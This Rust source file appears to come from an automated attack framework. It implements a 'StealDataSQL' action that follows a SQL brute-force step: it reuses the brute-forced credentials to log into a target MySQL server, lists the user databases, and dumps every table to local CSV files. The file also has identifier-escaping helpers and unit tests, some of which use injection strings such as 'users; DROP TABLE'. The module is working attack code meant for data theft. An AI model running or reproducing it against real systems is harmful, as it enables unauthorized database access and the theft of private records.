use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal data from MySQL servers by dumping tables.
/// Parent: SQLBruteforce.
pub struct StealDataSql;

impl Action for StealDataSql {
    fn name(&self) -> &'static str {
        "StealDataSQL"
    }
    fn port(&self) -> Option<u16> {
        Some(3306)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("SQLBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "sql").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let local_dir = build_output_dir(state, "sql", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(240), async {
            steal_sql_data(&target.ip, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, tables = count, "SQL data stolen");
                return ActionOutcome::Success;
            }
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "SQL steal error"),
            _ => {}
        }
    }

    ActionOutcome::Failed("no data stolen".to_string())
}

async fn steal_sql_data(
    ip: &str,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    // Step 1: List databases
    let db_output = tokio::process::Command::new("mysql")
        .args([
            "-h",
            ip,
            "-u",
            user,
            &format!("-p{password}"),
            "--connect-timeout=10",
            "-N",
            "-e",
            "SHOW DATABASES",
        ])
        .output()
        .await
        .map_err(|e| e.to_string())?;

    if !db_output.status.success() {
        return Err("failed to list databases".to_string());
    }

    let system_dbs = ["information_schema", "mysql", "performance_schema", "sys"];
    let databases: Vec<String> = String::from_utf8_lossy(&db_output.stdout)
        .lines()
        .filter(|db| !system_dbs.contains(&db.trim()))
        .map(|s| s.trim().to_string())
        .filter(|s| is_safe_sql_identifier(s))
        .collect();

    let mut total_tables = 0;

    for db in &databases {
        let escaped_db = escape_sql_identifier(db);

        // Step 2: List tables in each database
        let tables_output = tokio::process::Command::new("mysql")
            .args([
                "-h", ip,
                "-u", user,
                &format!("-p{password}"),
                "--connect-timeout=10",
                "-N", "-e",
                &format!("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={escaped_db} AND TABLE_TYPE='BASE TABLE'"),
            ])
            .output()
            .await;

        let tables: Vec<String> = match tables_output {
            Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
                .lines()
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty() && is_safe_sql_identifier(s))
                .collect(),
            _ => continue,
        };

        let safe_db_dir = db.replace('/', "_").replace('\\', "_");
        let db_dir = local_dir.join(&safe_db_dir);
        let _ = tokio::fs::create_dir_all(&db_dir).await;

        // Step 3: Dump each table to CSV
        for table in &tables {
            let escaped_table = escape_sql_identifier(table);
            let safe_table_name = table.replace('/', "_").replace('\\', "_");
            let csv_path = db_dir.join(format!("{safe_table_name}.csv"));
            let dump_output = tokio::process::Command::new("mysql")
                .args([
                    "-h",
                    ip,
                    "-u",
                    user,
                    &format!("-p{password}"),
                    "--connect-timeout=10",
                    "-N",
                    "-e",
                    &format!("SELECT * FROM {escaped_db}.{escaped_table}"),
                ])
                .output()
                .await;

            if let Ok(o) = dump_output {
                if o.status.success() {
                    let _ = tokio::fs::write(&csv_path, o.stdout).await;
                    total_tables += 1;
                }
            }
        }
    }

    Ok(total_tables)
}

/// Escape a SQL identifier using backtick quoting.
fn escape_sql_identifier(name: &str) -> String {
    let escaped = name.replace('`', "``");
    format!("`{escaped}`")
}

/// Reject identifiers with dangerous characters.
fn is_safe_sql_identifier(name: &str) -> bool {
    !name.is_empty()
        && !name.contains(';')
        && !name.contains('\'')
        && !name.contains('"')
        && !name.contains('\0')
        && !name.contains('\n')
        && name.len() < 256
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealDataSql;
        assert_eq!(action.name(), "StealDataSQL");
    }

    #[test]
    fn action_port() {
        let action = StealDataSql;
        assert_eq!(action.port(), Some(3306));
    }

    #[test]
    fn action_parent() {
        let action = StealDataSql;
        assert_eq!(action.parent(), Some("SQLBruteforce"));
    }

    #[test]
    fn escape_sql_identifier_simple_name() {
        assert_eq!(escape_sql_identifier("users"), "`users`");
    }

    #[test]
    fn escape_sql_identifier_with_backtick() {
        assert_eq!(escape_sql_identifier("my`table"), "`my``table`");
    }

    #[test]
    fn escape_sql_identifier_empty() {
        assert_eq!(escape_sql_identifier(""), "``");
    }

    #[test]
    fn escape_sql_identifier_multiple_backticks() {
        assert_eq!(escape_sql_identifier("a``b"), "`a````b`");
    }

    #[test]
    fn is_safe_sql_identifier_valid() {
        assert!(is_safe_sql_identifier("users"));
        assert!(is_safe_sql_identifier("my_table_123"));
        assert!(is_safe_sql_identifier("CamelCase"));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_empty() {
        assert!(!is_safe_sql_identifier(""));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_semicolon() {
        assert!(!is_safe_sql_identifier("users; DROP TABLE"));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_single_quote() {
        assert!(!is_safe_sql_identifier("users'--"));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_double_quote() {
        assert!(!is_safe_sql_identifier("users\""));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_null_byte() {
        assert!(!is_safe_sql_identifier("users\0"));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_newline() {
        assert!(!is_safe_sql_identifier("users\n"));
    }

    #[test]
    fn is_safe_sql_identifier_rejects_long_name() {
        let long_name = "a".repeat(256);
        assert!(!is_safe_sql_identifier(&long_name));
        // 255 should be fine
        let ok_name = "a".repeat(255);
        assert!(is_safe_sql_identifier(&ok_name));
    }
}
